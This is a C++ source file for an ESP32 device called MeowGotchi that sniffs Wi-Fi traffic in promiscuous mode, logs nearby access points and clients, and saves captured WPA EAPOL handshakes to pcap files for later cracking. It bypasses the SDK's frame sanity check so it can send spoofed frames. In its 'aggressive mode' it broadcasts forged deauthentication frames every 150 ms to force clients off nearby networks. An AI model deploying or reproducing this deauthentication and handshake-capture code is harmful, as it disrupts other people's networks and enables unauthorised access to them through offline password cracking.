/**
 * @file  wifi_hunter.cpp
 * @brief MeowGotchi WiFi engine implementation (see wifi_hunter.h).
 */
#include "wifi_hunter.h"
#include <Arduino.h>
#include <SD_MMC.h>
#include "esp_wifi.h"

/* Allow raw 802.11 TX with a spoofed source address (deauth). This overrides
 * the SDK's weak sanity-check symbol — the standard ESP32 deauther technique.
 * Only reached when the user explicitly enables aggressive mode. */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

/* ── Shared state touched by the promiscuous callback (WiFi task) ── */
namespace {

constexpr int MAXAP  = 96;
constexpr int MAXSTA = 128;
constexpr int QN     = 16;
constexpr int QCAP   = 256;

portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;

uint8_t  s_bssid[MAXAP][6];
uint8_t  s_bssid_eapol[MAXAP];
bool     s_bssid_shook[MAXAP];
int      s_bssid_n = 0;

uint8_t  s_sta[MAXSTA][6];
int      s_sta_n = 0;

volatile uint16_t s_deauths_seen = 0;
volatile uint16_t s_eapol = 0;
volatile uint16_t s_shakes = 0;

struct QFrame { uint16_t len; uint8_t data[QCAP]; };
QFrame          s_q[QN];
volatile int    s_qhead = 0, s_qtail = 0;
WifiHunter*     s_owner = nullptr;

inline bool mac_eq(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}
inline bool mac_mcast(const uint8_t* a) { return a[0] & 0x01; }

/* Returns AP-table index for bssid, inserting if new. -1 if table full. */
int ap_index(const uint8_t* bssid) {
    for (int i = 0; i < s_bssid_n; i++)
        if (mac_eq(s_bssid[i], bssid)) return i;
    if (s_bssid_n >= MAXAP) return -1;
    memcpy(s_bssid[s_bssid_n], bssid, 6);
    s_bssid_eapol[s_bssid_n] = 0;
    s_bssid_shook[s_bssid_n] = false;
    return s_bssid_n++;
}

void sta_seen(const uint8_t* mac) {
    if (mac_mcast(mac)) return;
    for (int i = 0; i < s_sta_n; i++)
        if (mac_eq(s_sta[i], mac)) return;
    if (s_sta_n < MAXSTA) memcpy(s_sta[s_sta_n++], mac, 6);
}

/* 802.11 header length for a data/mgmt frame (QoS + 4-addr aware). */
int hdr_len(const uint8_t* fr) {
    const uint8_t ftype = (fr[0] >> 2) & 0x3;
    const uint8_t fsub  = (fr[0] >> 4) & 0xF;
    int len = 24;
    const bool toDS   = fr[1] & 0x01;
    const bool fromDS = fr[1] & 0x02;
    if (toDS && fromDS) len += 6;                    /* 4-address frame */
    if (ftype == 2 && (fsub & 0x08)) len += 2;       /* QoS data */
    return len;
}

void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* fr = pkt->payload;
    const int flen = pkt->rx_ctrl.sig_len;
    if (flen < 24) return;

    const uint8_t ftype = (fr[0] >> 2) & 0x3;
    const uint8_t fsub  = (fr[0] >> 4) & 0xF;
    const uint8_t* addr1 = fr + 4;    /* receiver  */
    const uint8_t* addr2 = fr + 10;   /* transmitter */
    const uint8_t* addr3 = fr + 16;   /* bssid (typical) */

    portENTER_CRITICAL_ISR(&s_mux);

    if (ftype == 0) {                 /* management */
        if (fsub == 8 || fsub == 5) ap_index(addr3);   /* beacon / probe-resp */
        else if (fsub == 12 || fsub == 10) s_deauths_seen++; /* deauth/disassoc */
        sta_seen(addr1);
    } else if (ftype == 2) {          /* data */
        ap_index(addr3);
        sta_seen(addr2);
        sta_seen(addr1);

        /* EAPOL detection: LLC/SNAP AA AA 03 00 00 00 88 8E */
        int h = hdr_len(fr);
        if (flen >= h + 8 &&
            fr[h] == 0xAA && fr[h+1] == 0xAA && fr[h+2] == 0x03 &&
            fr[h+6] == 0x88 && fr[h+7] == 0x8E) {
            s_eapol++;
            int idx = ap_index(addr3);
            if (idx >= 0) {
                if (s_bssid_eapol[idx] < 255) s_bssid_eapol[idx]++;
                if (!s_bssid_shook[idx] && s_bssid_eapol[idx] >= 2) {
                    s_bssid_shook[idx] = true;
                    s_shakes++;
                }
            }
            /* Queue the raw frame for pcap (drop if queue full). */
            int nt = (s_qtail + 1) % QN;
            if (nt != s_qhead) {
                int n = flen > QCAP ? QCAP : flen;
                s_q[s_qtail].len = n;
                memcpy(s_q[s_qtail].data, fr, n);
                s_qtail = nt;
            }
        }
    }

    portEXIT_CRITICAL_ISR(&s_mux);
}

} // namespace

/* ── pcap writing (app task) ── */
static bool  s_pcap_started = false;
static char  s_pcap_path[48] = {0};

static void pcap_write_global(fs::File& f) {
    uint8_t gh[24] = {0};
    uint32_t magic = 0xa1b2c3d4; memcpy(gh, &magic, 4);
    uint16_t vmaj = 2, vmin = 4;  memcpy(gh+4, &vmaj, 2); memcpy(gh+6, &vmin, 2);
    uint32_t snaplen = 65535;     memcpy(gh+16, &snaplen, 4);
    uint32_t dlt = 105;           memcpy(gh+20, &dlt, 4);  /* LINKTYPE_IEEE802_11 */
    f.write(gh, 24);
}

/* ── WifiHunter ── */

void WifiHunter::begin(bool sd_ready)
{
    _sd_ready = sd_ready;
    _running  = true;
    _stats = HunterStats{};
    _stats.start_ms = millis();

    s_owner = this;
    s_bssid_n = s_sta_n = 0;
    s_deauths_seen = s_eapol = s_shakes = 0;
    s_qhead = s_qtail = 0;
    s_pcap_started = false;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_stats.channel, WIFI_SECOND_CHAN_NONE);
}

void WifiHunter::stop()
{
    _running = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    s_owner = nullptr;
}

uint32_t WifiHunter::uptime_s() const
{
    return (millis() - _stats.start_ms) / 1000;
}

void WifiHunter::_hop()
{
    uint8_t ch = _stats.channel + 1;
    if (ch > 13) ch = 1;
    _stats.channel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void WifiHunter::_drainHandshakes()
{
    if (!_sd_ready) { /* still drain the queue so it can't wedge */
        portENTER_CRITICAL(&s_mux);
        s_qhead = s_qtail;
        portEXIT_CRITICAL(&s_mux);
        return;
    }
    while (s_qhead != s_qtail) {
        QFrame fr;
        portENTER_CRITICAL(&s_mux);
        fr = s_q[s_qhead];
        s_qhead = (s_qhead + 1) % QN;
        portEXIT_CRITICAL(&s_mux);

        if (!s_pcap_started) {
            SD_MMC.mkdir("/handshakes");
            snprintf(s_pcap_path, sizeof(s_pcap_path),
                     "/handshakes/meowgotchi-%lu.pcap", (unsigned long)millis());
            fs::File nf = SD_MMC.open(s_pcap_path, FILE_WRITE);
            if (nf) { pcap_write_global(nf); nf.close(); s_pcap_started = true; }
            else break;    /* SD write failed — stop trying this pass */
        }
        fs::File f = SD_MMC.open(s_pcap_path, FILE_APPEND);
        if (!f) break;
        uint32_t ts = millis();
        uint8_t ph[16];
        uint32_t sec = ts / 1000, usec = (ts % 1000) * 1000, cap = fr.len;
        memcpy(ph,    &sec,  4); memcpy(ph+4,  &usec, 4);
        memcpy(ph+8,  &cap,  4); memcpy(ph+12, &cap,  4);
        f.write(ph, 16);
        f.write(fr.data, fr.len);
        f.close();
    }
}

void WifiHunter::_sendDeauth()
{
    /* Broadcast deauth from a random discovered AP (reason 7). */
    uint8_t bssid[6];
    portENTER_CRITICAL(&s_mux);
    int n = s_bssid_n;
    if (n > 0) memcpy(bssid, s_bssid[millis() % n], 6);
    portEXIT_CRITICAL(&s_mux);
    if (n == 0) return;

    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   /* addr1: broadcast client */
        0,0,0,0,0,0,                          /* addr2: AP (filled below) */
        0,0,0,0,0,0,                          /* addr3: AP */
        0x00, 0x00,                           /* seq */
        0x07, 0x00                            /* reason: class-3 frame */
    };
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK)
        _stats.deauths++;
}

void WifiHunter::loop()
{
    if (!_running) return;
    const uint32_t now = millis();

    if (now - _last_hop >= 400) { _last_hop = now; _hop(); }

    if (_aggressive && now - _last_deauth >= 150) { _last_deauth = now; _sendDeauth(); }

    _drainHandshakes();

    /* Snapshot shared counters into stats. */
    portENTER_CRITICAL(&s_mux);
    _stats.aps    = (uint16_t)s_bssid_n;
    _stats.stas   = (uint16_t)s_sta_n;
    _stats.eapol  = s_eapol;
    _stats.shakes = s_shakes;
    portEXIT_CRITICAL(&s_mux);
}
